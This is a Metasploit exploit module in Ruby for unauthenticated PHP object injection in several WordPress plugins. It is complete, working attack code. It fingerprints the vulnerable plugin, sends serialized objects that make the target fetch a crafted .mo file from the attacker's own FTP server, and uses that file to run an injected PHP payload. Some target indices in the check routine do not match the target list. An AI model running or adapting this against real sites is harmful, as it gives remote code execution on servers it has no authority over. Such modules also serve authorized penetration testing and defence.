##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::FtpServer
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Plugins Unserialize Code Execution',
      'Description'    => %q{
        This module exploits multiple PHP object injection vulnerabilities affecting various
        WordPress plugins. Targets WordPress 3.4 - 4.x (tested on WordPress 4.5.3 - 4.7.2).
      },
      'Platform'       => 'php',
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Yorick Koster',
           # Google Analytics Counter Tracker < 3.5.1'
          'Remco Vermeulen'
        ],
      # n is converted to $n in make_plural_form_function()
      'Payload'        => { 'BadChars'    => "n" } ,
      'References'     =>
        [
          ['URL', 'https://securify.nl/advisory/SFY20160602/google_forms_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160603/ecwid_ecommerce_shopping_cart_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160604/cms_commander_client_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160605/infinitewp_client_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160606/analytics_stats_counter_statistics_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160607/yith_woocommerce_compare_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://securify.nl/advisory/SFY20160733/google_analytics_counter_tracker_wordpress_plugin_unauthenticed_php_object_injection_vulnerability.html']
        ],
      'Arch'           => ARCH_PHP,
      'Targets'        => [
        ['Automatic Targeting', { 'auto' => true }  ],
        # https://wordpress.org/plugins/wpgform/
        ['Google Forms < 0.91',
          {'prefix' => '',
           'suffix' => '',
           'base64' => true,
           'urlencode' => true,
           'method' => 'post',
           'data' => 'wpgform-form-id=1&wpgform-options=&wpgform-action='
          }],
        # https://wordpress.org/plugins/ecwid-shopping-cart/
        ['Ecwid Ecommerce Shopping Cart < 4.4.4',
          {'prefix' => "O:13:\"WP_User_Query\":1:{s:28:\"\x00WP_User_Query\x00compat_fields\";a:1:{i:0;",
           'suffix' => '}}',
           'base64' => false,
           'urlencode' => true,
           'method' => 'cookie',
           'data' => 'ecwid_create_store_clicked=1; ecwid_oauth_state='
          }],
        # https://wordpress.org/plugins/cms-commander-client/
        ['CMS Commander Client < 2.22',
          {'prefix' => 'a:3:{s:11:"cmsc_action";s:3:"pwn";s:4:"cmsc";s:3:"yes";s:6:"params";a:1:{s:8:"username";',
           'suffix' => '}}',
           'base64' => true,
           'urlencode' => false,
           'method' => 'post',
           'data' => ''
          }],
        # https://wordpress.org/plugins/iwp-client/
        ['InfiniteWP Client < 1.6.1.1',
          {'prefix' => 'a:2:{s:10:"iwp_action";s:3:"pwn";s:6:"params";a:1:{s:8:"username";',
           'suffix' => '}}',
           'base64' => true,
           'urlencode' => false,
           'method' => 'post',
           'data' => ''
          }],
        # https://wordpress.org/plugins/stats-counter/
        ['Analytics Stats Counter Statistics',
          {'prefix' => 'a:1:{s:6:"method";',
           'suffix' => '}',
           'base64' => true,
           'urlencode' => true,
           'method' => 'post',
           'data' => 'wpadm_stat_request='
          }],
        # https://wordpress.org/plugins/yith-woocommerce-compare/
        ['YITH WooCommerce Compare <2.1.0',
          {'prefix' => '',
           'suffix' => '',
           'base64' => false,
           'urlencode' => true,
           'method' => 'cookie',
           'data' => 'yith_woocompare_list='
          }],
        # https://wordpress.org/plugins/analytics-counter/
        ['Google Analytics Counter Tracker < 3.5.1',
          {'prefix' => 'a:1:{s:4:"sign";',
           'suffix' => '}',
           'base64' => true,
           'urlencode' => true,
           'method' => 'post',
           'data' => 'wpadm_ga_request='
          }],
        ],
        'DisclosureDate' => 'Aug 05 2016',
        'DefaultTarget'  => 0))

        register_options(
        [
          OptAddress.new('LHOST', [ true, 'The local IP address from where the victim downloads the MO payload' ]),
          OptPort.new('SRVPORT', [ true, "The local port to use for the FTP server", 21 ]),
          OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
        ], self.class)

    deregister_options('SSLVersion', 'SSLCert')
  end

  def check
    begin
      # InfiniteWP Client
      # Active Installs: 400,000+
      res = send_request_raw({ 'uri' => target_uri.path, 'method' => 'POST',
        'data' => 'YToxOntzOjEwOiJpd3BfYWN0aW9uIjtzOjQ6InRlc3QiO30=' })
      if (res && res.body.include?('<IWPHEADER>'))
        @my_target = targets[4] if target['auto']
        return Exploit::CheckCode::Appears
      end

      res = send_request_cgi({ 'uri' => target_uri.path })
      # YITH WooCommerce Compare
      # Active Installs: 100,000+
      if (res && res.body.include?('/wp-content/plugins/yith-woocommerce-compare/'))
        @my_target = targets[7] if target['auto']
        return Exploit::CheckCode::Appears
      end
      # Google Forms
      # Active Installs: 20,000+
      if (res && res.body.include?('wpgform-css-css'))
        @my_target = targets[1] if target['auto']
        return Exploit::CheckCode::Appears
      end
      # Ecwid Ecommerce Shopping Cart
      # Active Installs: 20,000+
      if (res && res.body.include?('/wp-content/plugins/ecwid-shopping-cart/'))
        @my_target = targets[2] if target['auto']
        return Exploit::CheckCode::Appears
      end
      # YITH Essential Kit for WooCommerce #1 (YITH WooCommerce Compare)
      # Active Installs: 10,000+
      if (res && res.body.include?('/wp-content/plugins/yith-essential-kit-for-woocommerce-1/modules/yith-woocommerce-compare/'))
        @my_target = targets[7] if target['auto']
        return Exploit::CheckCode::Appears
      end

      # Analytics Stats Counter Statistics
      # Active Installs: 20,000+
      res = send_request_raw({ 'uri' => target_uri.path, 'method' => 'POST',
        'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
        'data' => 'wpadm_stat_request=YToxOntpOjA7czo0OiJ0ZXN0Ijt9' })
      if (res && res.body.include?('<wpadm>'))
        @my_target = targets[6] if target['auto']
        return Exploit::CheckCode::Appears
      end

      # Google Analytics Counter Tracker
      # Active Installs: 20,000+
      res = send_request_raw({ 'uri' => target_uri.path, 'method' => 'POST',
        'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
        'data' => 'wpadm_ga_request=YToxOnt9' })
      if (res && !res.body.downcase.include?('<!doctype html>'))
        @my_target = targets[8] if target['auto']
        return Exploit::CheckCode::Appears
      end

      # CMS Commander Client
      # Active Installs: 10,000+
      res = send_request_raw({ 'uri' => target_uri.path, 'method' => 'POST',
        'data' => 'YToyOntzOjExOiJjbXNjX2FjdGlvbiI7czo0OiJ0ZXN0IjtzOjQ6ImNtc2MiO3M6MzoieWVzIjt9' })
      if (res && res.body.include?('<CMSCHEADER>'))
        @my_target = targets[3] if target['auto']
        return Exploit::CheckCode::Appears
      end

      # nBill Lite
      # Active Installs: 30+
      res = send_request_cgi({ 'uri' => target_uri.path + '?nbill=my-account' })
      if (res && res.body.include?('nb_request_values'))
        @my_target = targets[5] if target['auto']
        return Exploit::CheckCode::Appears
      end

      return Exploit::CheckCode::Safe

      rescue ::Rex::ConnectionError
        return Exploit::CheckCode::Safe
      end
  end

  def exploit
    @my_target = target
    if @my_target['auto']
      print_status("#{peer} - Fingerprinting")

      check_code = check

      unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
        print_error("#{peer} - Failed to detect a vulnerable instance")
        fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable instance")
      end

      if @my_target.nil? || @my_target['auto']
        print_error("#{peer} - Failed to auto detect, try setting a manual target")
        fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target")
      end
    end

    print_status("#{peer} - Exploiting #{@my_target.name}")

    headers =  "Content-Type: text/plain; charset=UTF-8\n"
    headers << "Plural-Forms: nplurals=2; plural=n);}#{payload.encoded}die();/*"

    @mo_file =  "\xde\x12\x04\x95\x00\x00\x00\x00\x01\x00\x00\x00\x1c\x00\x00\x00"
    @mo_file << "\x24\x00\x00\x00\x03\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00"
    @mo_file << "\x38\x00\x00\x00"
    @mo_file << [headers.length].pack('V*')
    @mo_file << "\x39\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    @mo_file << headers
    @mo_file << "\x00"

    wp_theme_name = rand_text_alpha_lower(10)
    wp_theme_text_domain = rand_text_alpha_lower(10)
    wp_theme_stylesheet = rand_text_alpha_lower(10)
    wp_theme_theme_root = 'ftp://' + datastore['LHOST'] + ':' + datastore['SRVPORT'].to_s

    wp_theme = @my_target['prefix']
    wp_theme << "O:8:\"WP_Theme\":3:{s:17:\"\x00WP_Theme\x00headers\";a:2:{"
    wp_theme << "s:4:\"Name\";s:#{wp_theme_name.length}:\"#{wp_theme_name}\";"
    wp_theme << "s:10:\"TextDomain\";s:#{wp_theme_text_domain.length}:\"#{wp_theme_text_domain}\";}"
    wp_theme << "s:20:\"\x00WP_Theme\x00stylesheet\";s:#{wp_theme_stylesheet.length}:\"#{wp_theme_stylesheet}\";"
    wp_theme << "s:20:\"\x00WP_Theme\x00theme_root\";s:#{wp_theme_theme_root.length}:\"#{wp_theme_theme_root}\";}"
    wp_theme << @my_target['suffix']

    if @my_target['base64']
      wp_theme = Rex::Text.encode_base64(wp_theme)
    end

    if @my_target['urlencode']
      wp_theme = Rex::Text.uri_encode(wp_theme)
    end

    print_status("Starting the FTP server")
    start_service()

    if @my_target['method'] == 'cookie'
      send_request_raw({
        'method' => 'GET',
        'uri' => target_uri.path,
        'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded',
                       'Cookie' =>  @my_target["data"] + wp_theme}
      })
    else
      send_request_raw({
        'method' => 'POST',
        'uri' => target_uri.path,
        'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
        'data' => @my_target["data"] + wp_theme,
      })
    end

    print_status("Stopping the FTP server")
    stop_service()
  end

  def on_client_command_retr(c,arg)
    print_status("#{@state[c][:name]} FTP download request for #{arg}")

    conn = establish_data_connection(c)
    if(not conn)
      c.put("425 Can't build data connection\r\n")
      return
    end

    c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
    conn.put(@mo_file)
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  def on_client_command_size(c,arg)
    print_status("#{@state[c][:name]} FTP size request for #{arg}")
    c.put("213 #{@mo_file.length}\r\n")
  end

end
